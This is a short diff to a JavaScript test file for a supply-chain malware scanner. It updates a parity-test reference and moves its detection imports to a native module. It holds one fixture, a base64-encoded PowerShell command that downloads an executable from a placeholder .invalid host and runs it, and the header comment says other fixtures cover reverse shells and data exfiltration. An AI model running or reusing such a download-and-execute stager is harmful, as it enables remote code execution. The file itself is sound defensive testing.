@@ -2,14 +2,15 @@
 // strings, reverse shells, host information sent out, the grading of
 // import-time reasons and aliased decoders. Twin of
 // python/tests/scanner/test_supply_chain_signals.py; on a random corpus the
-// engines are held to each other by tests/architecture/test_js_parity_hooks.py.
+// engines are held to each other by tests/architecture/test_rust_parity_hooks.py
+// (the npm package runs the native engine).
 // Everything is inert text: hosts are .invalid, nothing is executed.
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { Buffer } from "node:buffer";
 import { installScriptRisk, importTimeRisk, importTimeSeverity, scanFile } from "../src/index.js";
-import { powershellRisk, stagerAt, reverseShellAt, readsOwnSource, runsOwnSourceAt, importCode } from "../src/lib/hooks.js";
+import { powershellRisk, stagerAt, reverseShellAt, readsOwnSource, runsOwnSourceAt, importCode } from "../src/lib/native.js";
 
 const PS_RUN = Buffer.from('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
   + 'Invoke-Expression "a.exe"', "utf16le").toString("base64");
